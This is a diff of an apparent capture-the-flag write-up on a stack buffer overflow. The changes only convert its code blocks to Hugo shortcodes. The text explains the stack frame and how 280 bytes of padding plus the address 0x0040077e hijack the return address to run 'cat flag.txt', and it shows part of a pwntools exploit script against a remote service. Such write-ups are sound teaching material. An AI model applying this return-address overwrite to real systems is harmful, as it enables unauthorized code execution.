@@ -28,11 +28,12 @@ Let's understand how the stack is working here, and how can we overwrite local v
 ---------------------------------------------
 Starting with the Standard Entry Sequence 
 --------------------------------------------- 
-```asm
+{{< code language="asm" title="Standard Entry Sequence" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
 push rbp
 mov rbp, rsp
 sub rsp, 0x110
-```
+{{< /code >}}
+
 Here, `rbp` register is pushed onto the stack which saves the value of the base pointer `rbp` . The base pointer `RBP` always points to the base of the stack, and the Stack pointer `RSP` always points to the top of the stack.  
 Then, the current value of `rsp` is moved onto `rbp`, meaning the `rbp` also now points to top of the stack.  
 Finally, `sub rsp, 0x110` allocates `0x110` bytes on the stack to store the local variables.  
@@ -89,8 +90,8 @@ Thus, by writing extra `8 bytes` we can fully overwrite `Rbp` and thus can contr
 In `disassembled` code above, it can be seen that `cat flag.txt` is being called at location `0x0040077e`. So, providing `280` bytes of input and adding that memory location will overwrite the return address and thus invoke the `cat flag.txt` command and show us the flag.
 
 I used `pwntools` to create an exploit that displays us the flag.   
-  
-```python
+
+{{< code language="python" title="Exploit Payload" id="2" expand="Show" collapse="Hide" isCollapsed="false" >}}
 from pwn import *
 
 #Sets remote host and port
@@ -117,8 +118,7 @@ payload += p64(0x0040077e)
 p.sendline(payload)
 
 p.interactive()
-```
-
+{{< /code >}}
 
 Hope you learned something.  
 Thank you so much for reading!  
